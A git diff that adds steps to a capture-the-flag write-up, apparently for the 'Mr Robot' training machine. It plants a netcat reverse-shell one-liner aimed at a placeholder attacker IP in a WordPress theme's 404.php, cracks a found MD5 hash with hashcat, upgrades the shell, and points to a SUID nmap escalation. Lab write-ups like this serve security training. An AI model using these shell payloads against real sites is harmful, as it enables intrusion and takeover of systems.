@@ -184,8 +184,44 @@ Now we are able to login to the wordpress dashboard
 
 There are several ways to exploit the wordpress dashboard and get a reverse shell. The easiest way that  I like is to add php code to a theme.
 
-1. Go to `Appearance` -> `editor`
+1. Go to `Appearance` -> `editor` and select a non active theme. In this case I used 'twentythirteen'. Select the 404.php
+2. add the the folliwning code to the theme:
+```
+exec("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc <ATTACKER IP> 443 >/tmp/f");
+```
+3. Update the file
+4. start a listener on port 443.
+5. Now visit the URL: http://10.10.217.185//wp-content/themes/twentythirteen/404.php
 
+BOOM! We have a shell as daemon.
+
+In the /home/robot folder we can find `key-2-of-3.txt`
+
+# Privilege escalation.
+In the same folder there is an interresting file called `password.raw-md5`. When we read the contents we see the following:
+```
+robot:c3fcd3d76192e4007dfb496cca67e13b
+```
+
+We can successfully crack the hash with hashcat:
+```sh
+hashcat c3fcd3d76192e4007dfb496cca67e13b -m 0 /usr/share/wordlists/rockyou.txt
+```
+After cracking the hash we can switch to user robot after upgradig our tty.:
+```
+python -c 'import pty; pty.spawn("/bin/bash")'
+
+su robot
+```
+
+# Root
+During enumartion we find an interresting file accoring to linpeas. And sure it is interesting: an nmap binary with the suid bit set:
+
+
+The instructions to exploit this are found here: [](https://gtfobins.github.io/gtfobins/nmap/#suid)
+
+
+Let's preform this an get the last flag!
 
 
 
